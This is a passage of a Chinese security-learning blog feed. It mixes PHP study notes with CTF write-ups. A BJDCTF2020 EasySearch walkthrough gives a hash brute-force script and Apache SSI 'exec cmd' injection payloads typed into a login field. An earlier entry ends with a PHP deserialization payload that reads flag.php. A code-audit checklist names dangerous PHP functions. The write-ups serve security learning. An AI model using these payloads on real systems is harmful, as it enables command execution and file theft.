class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p><h4 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h4><p>通过这题好好再恶补一次我的代码审计</p><h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>摘抄于一篇文章：<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p><p>php中$this-&gt;的用法简单介绍</p><p>php中我们一般是先声明一个类，然后用这个类去实例化对象</p><p>$this的含义是表示实例化后的具体对象</p><p>$this-&gt;表示在类本身内部使用本类的属性或者方法</p><p>‘ -&gt; ’ 符号是插入式解引用操作符。</p><p>换句话说，它是有调用由引用传递参数的子程序的方法</p><p>例子：</p><p>比如我们声明一个User类，它只含有一个属性 $name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>现在，我们给User类加个方法，就用getName()方法，输出$name的值吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如何使用呢？</span></span><br><span class="line">$user1 = <span class="keyword">new</span> User();</span><br><span class="line">$user1-&gt;name = <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line">$user1-&gt;getName();        <span class="comment">//这里就会输出张三！</span></span><br><span class="line">$user2 = <span class="keyword">new</span> User();</span><br><span class="line">$user2-&gt;name = <span class="string">&#x27;李四&#x27;</span>;  </span><br><span class="line">$user2-&gt;getName();       <span class="comment">//这里会输出李四！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我也上在线工具试了下</p><p><img src="/2021/09/03/buu/19/image-20210905155102186.png" alt="image-20210905155102186"></p><h5 id="2-PHP中的魔术方法"><a href="#2-PHP中的魔术方法" class="headerlink" title="2.PHP中的魔术方法"></a>2.PHP中的魔术方法</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__sleep() &#x2F;&#x2F;使用serialize时触发</span><br><span class="line">__destruct() &#x2F;&#x2F;对象被销毁时触发</span><br><span class="line">__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</span><br><span class="line">__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() &#x2F;&#x2F;把类当作字符串使用时触发</span><br><span class="line">__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h5 id="3-进一步理解本题代码"><a href="#3-进一步理解本题代码" class="headerlink" title="3.进一步理解本题代码"></a>3.进一步理解本题代码</h5><p>_invoke()函数：对象本身是不能够当作函数使用的，一旦被当作函数使用，，就会回调执行 _invoke()方法</p><p>_construct()函数：构造函数/方法</p><p>构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(参数列表)&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_get()函数： 访问不存在的成员变量时触发</p><p>作者这段话今天看懂了点</p><p><img src="/2021/09/03/buu/19/image-20210905161234966.png" alt="image-20210905161234966"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00解题&quot;&gt;&lt;a href=&quot;#0x00解题&quot; class=&quot;headerlink&quot; title=&quot;0x00解题&quot;&gt;&lt;/a&gt;0x00解题&lt;/h4&gt;&lt;p&gt;借鉴博客&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_4395</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(一)</title>
    <link href="http://daweitech.github.io/2021/09/03/php/1/"/>
    <id>http://daweitech.github.io/2021/09/03/php/1/</id>
    <published>2021-09-03T02:51:22.000Z</published>
    <updated>2021-09-21T12:44:48.663Z</updated>
    
    <content type="html"><![CDATA[<p> 从创建示例Web应用开始：Bob的汽车零部件商店</p><p>创建订单表单：</p><p>任何服务器端脚本语言最常见的应用场景是之一</p><p>1.1</p><p>就是处理HTML表单。</p><p>接下来程序清单1-1：order.html，商店基础HTML代码</p><p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p><p>呈现画面</p><form action="processorder.php" method="post"><table style="border: 0px;"><tr style="background: #cccccc;">    <td style="width: 150px; text-align: center;">Item</td>    <td style="width: 15px; text-align: center;">Quantity</td></tr><tr>    <td>Tries</td>    <td><input type="text" name="tireqty" size="3" maxlength="3"></td></tr><tr>    <td>Oil</td>    <td><input type="text" name="oilqty" size="3" maxlength="3"></td></tr><tr>    <td>Spark Plugs</td>    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td></tr><tr>    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>    </tr>    </table>    </form><p>注意：该表单的action属性被设置为能够处理客户订单的PHP脚本名称，后续会对该脚本进行增添。</p><p>一般地，actions属性就是用户点击提交按钮时将要载入的URL</p><p>用户在表单中输入的数据将按照method属性中指定的HTTP方法发送到这个URL，该方法是get（附加在URL的结尾）或者post（以单独的信息发送）。</p><p>1.2</p><p>表单的处理，需要创建在form标记的action属性中指定的处理脚本，该脚本为processorder.php，代码如下</p><p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p><p>我们在h2处添加了php代码</p><p>这样我们看到php的echo输出语句同时，</p><p>在html页面点击Submit Order也会有类似内容显示</p><p><img src="/2021/09/03/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p><p>请注意</p><p>我们所编写的PHP代码是如何嵌入到一个常见的HTML文件中的</p><p>通过浏览器，我们查看该HTML的源代码</p><p><img src="/2021/09/03/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p><p>以上代码并没有显示原始的PHP语句</p><p>这是因为PHP解释器已经运行了该脚本，并且用该脚本的输出代替了脚本的本身。</p><p>也就是说，通过PHP，我们可以生成能在任何浏览器中查看的纯HTML，换一个意思理解，用户的浏览并不需要理解PHP。</p><p>此文件组成：</p><p>1.HTML 2.PHP标记 3.PHP语句 4.空格</p><p>1.3.1</p><p>PHP标记</p><?php    为开始，?><p>为结束</p><p>​        这样的标记称作PHP标记，可以告诉服务器PHP代码的开始和结束。</p><p>XML风格(建议使用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>简短风格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>1.3.2</p><p>PHP语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>echo语句：将传递给其自身的字符串打印或者回显到浏览器</p><p>1.7.1</p><p>PHP的数据类型</p><p>1.整数    Integer</p><p>2.浮点数    Float</p><p>3.字符串    String</p><p>4.布尔    Boolean</p><p>5.数组    Array</p><p>6.对象    Object</p><p>附：三个特殊类型 NULL（空）、resource（资源）、</p><p>callable 。</p><p>1.7.2</p><p>类型强度</p><p>PHP是一种弱类型，或者动态型语言</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure><p>此时，$total1是一个整数类型的变量</p><p>而$total2是一个浮点类型的变量。</p><p>若添加以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure><p>则$total2是字符串类型的变量。</p><p>1.7.3</p><p>类型转换</p><p>1.7.4</p><p>可变变量</p><p>附代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;title&gt;Bob&#39;s Auto Parts - Order Results&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;h1&gt;Bob&#39;s Auto Parts&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;h2&gt;Order Results&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo &#39;&lt;p&gt; Order Processed.&lt;&#x2F;p&gt;&#39;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;p&gt;Order processed at &quot;;</span><br><span class="line">&#x2F;&#x2F;    echo date(&#39;H:i, jS F Y&#39;);</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  echo &quot;&lt;p&gt;Order processed at &quot;.date(&#39;H:i, jS F Y&#39;).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  $tireqty &#x3D; $_POST[&#39;tireqty&#39;];</span><br><span class="line">  $oilqty &#x3D; $_POST[&#39;oilqty&#39;];</span><br><span class="line">  $sparkqty &#x3D; $_POST[&#39;sparkqty&#39;];</span><br><span class="line">  $address &#x3D; $_POST[&#39;address&#39;];</span><br><span class="line">  echo &#39;&lt;p&gt;Your order is as follows: &lt;&#x2F;p&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($tireqty).&#39; tires&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($oilqty).&#39; bottle of oil&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($sparkqty).&#39; spark plugs&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo &#39;address is &#39;.htmlspecialchars($address);</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo phpinfo();</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> $totalqty  &#x3D; 0;</span><br><span class="line"> $totalqty &#x3D; $tireqty + $oilqty + $sparkqty;</span><br><span class="line"> echo &quot;&lt;p&gt;Items ordered :&quot;. $totalqty.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"> $totalomunt &#x3D; 0.00;</span><br><span class="line"></span><br><span class="line"> define(&#39;TIREPRICE&#39;, 100);</span><br><span class="line"> define(&#39;OILPRICE&#39;, 10);</span><br><span class="line"> define(&#39;SPARKPRICE&#39;, 4);</span><br><span class="line"> $totalomunt &#x3D; $tireqty * TIREPRICE</span><br><span class="line">     + $oilqty * OILPRICE</span><br><span class="line">     + $sparkqty * SPARKPRICE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> echo &quot;Subtotal: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line"> $taxrate &#x3D; 0.10;</span><br><span class="line"> $totalomunt &#x3D; $totalomunt * (1+ $taxrate);</span><br><span class="line"> echo &quot;Total including tax: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 从创建示例Web应用开始：Bob的汽车零部件商店&lt;/p&gt;
&lt;p&gt;创建订单表单：&lt;/p&gt;
&lt;p&gt;任何服务器端脚本语言最常见的应用场景是之一&lt;/p&gt;
&lt;p&gt;1.1&lt;/p&gt;
&lt;p&gt;就是处理HTML表单。&lt;/p&gt;
&lt;p&gt;接下来程序清单1-1：order.html，商店基础HTML</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://daweitech.github.io/2021/09/02/buu/18/"/>
    <id>http://daweitech.github.io/2021/09/02/buu/18/</id>
    <published>2021-09-02T11:56:57.000Z</published>
    <updated>2021-09-02T12:57:15.636Z</updated>
    
    <content type="html"><![CDATA[<p> 参考博客：</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>打开后只有一个输入框</p><p>尝试了一下sql注入</p><p>只会出现一样的弹框</p><p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>扫描目录后发现还有swp文件</p><p>访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">$content &#x3D; uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>映入眼帘的就是hash函数</p><p>注意到登陆代码</p><p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p><p>‘Welcome to manage system’</p><p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>登录成功后会生成相应的shtml文件</p><p>开始解题</p><p>先得到脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #父类的构造方法</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑完后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure><p>选择其中一个密码登录</p><p>然后查看网络状态</p><p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>用这里的路径访问下</p><p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>看wp知道了后面用ssti模板注入</p><p>这里有一个知识点</p><p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p><p>username成为注入点</p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #看一下上层目录<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>找到了</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 参考博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/devilare/article/details/119351945&quot;&gt;https://blog.csdn.net/devilare/article/details/119351945</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(二)</title>
    <link href="http://daweitech.github.io/2021/09/02/php/0/"/>
    <id>http://daweitech.github.io/2021/09/02/php/0/</id>
    <published>2021-09-02T09:57:07.000Z</published>
    <updated>2021-09-02T12:56:37.441Z</updated>
    
    <content type="html"><![CDATA[<h4 id="文件上传漏洞挖掘与利用"><a href="#文件上传漏洞挖掘与利用" class="headerlink" title="文件上传漏洞挖掘与利用"></a>文件上传漏洞挖掘与利用</h4><p>1.搜索 move_uploaded_file()函数, 在PHP中上传函数只有这一个</p><p>2.查看上传文件的代码是否存在限制或可以绕过</p><p>3.搜索include、require、include_once、require_once函数，</p><p>是否存在可控变量。</p><p>4.追踪程序运行流程，查看模块加载时包含的文件是否可控。</p><p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p><p>任意文件读取、下载、写入、删除、漏洞挖掘与利用</p><p>黑盒看功能点对应的文件， 再去读文件</p><p>搜索文件读取的函数， 查看是否存在直接或者直接控制的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents、highlight_file、fopen、readfile、fread、</span><br><span class="line"></span><br><span class="line">fgetss、fgets、parse_ini_file、show_source、file、fwrite、</span><br><span class="line"></span><br><span class="line">file_put_contents、unlink</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p><h4 id="SSRF漏洞挖掘与利用"><a href="#SSRF漏洞挖掘与利用" class="headerlink" title="SSRF漏洞挖掘与利用"></a>SSRF漏洞挖掘与利用</h4><p>1.找对应功能点，直接黑盒测试查看是否能简单利用，不能再去追踪流程分析传递过程。</p><p>2.白盒挖掘则需要搜索带有变量参数的相关函数</p><p>3.file_get_contents()</p><p>4.fsockopen()</p><p>5.curl_exec()</p><p>6.fopen()</p><p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p><h4 id="代码执行漏洞挖掘与利用"><a href="#代码执行漏洞挖掘与利用" class="headerlink" title="代码执行漏洞挖掘与利用"></a>代码执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数， 回溯跟踪</p><p>2.eval、assert、preg_repleace、$_ GET($_POST[]);</p><p>call_user_func、call_user_func_array、array_map等函数。</p><p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p><h4 id="命令执行漏洞挖掘与利用"><a href="#命令执行漏洞挖掘与利用" class="headerlink" title="命令执行漏洞挖掘与利用"></a>命令执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数，回溯跟踪</p><p>2.system、exec、shell_exec、passthru</p><p>反引号``、popen、ob_start、pcntl_exec</p><p>proc_open</p><p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p><h4 id="SQL注入漏洞挖掘与利用"><a href="#SQL注入漏洞挖掘与利用" class="headerlink" title="SQL注入漏洞挖掘与利用"></a>SQL注入漏洞挖掘与利用</h4><p>1.跟踪参数传递是否存在过滤，数据库查询是否使用预编译</p><p>2.一般数据库查询会被封装在几个核心文件中，反复调用。当然在某些复杂的功能中，</p><p>可能也会存在不使用封装的函数，所以需要全面排查。</p><p>3.在挖掘的过程中，也要注意宽字节注入、二次注入等方法的可能性。</p><p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p><h4 id="XSS漏洞挖掘与利用"><a href="#XSS漏洞挖掘与利用" class="headerlink" title="XSS漏洞挖掘与利用"></a>XSS漏洞挖掘与利用</h4><p>1.查看参数传递进入到输出是否存在过滤函数</p><p>2.常见的输出函数，print、print_r、echo、printf、sprint、die</p><p>var_dump、var_export等</p><p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p><h4 id="CSRF漏洞挖掘与利用"><a href="#CSRF漏洞挖掘与利用" class="headerlink" title="CSRF漏洞挖掘与利用"></a>CSRF漏洞挖掘与利用</h4><p>1.查看提交数据功能点，抓包查看是否token，查看核心代码中是否存在token或者referer校验</p><p>2.可以直接搜索token、referer关键字</p><p>反序列化漏洞挖掘与利用</p><p>搜索带有变量参数的反序列化函数unserliaze()，查看是否存在利用点</p><p>反序列化中需关注的函数</p><p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p><h4 id="install系统重装漏洞"><a href="#install系统重装漏洞" class="headerlink" 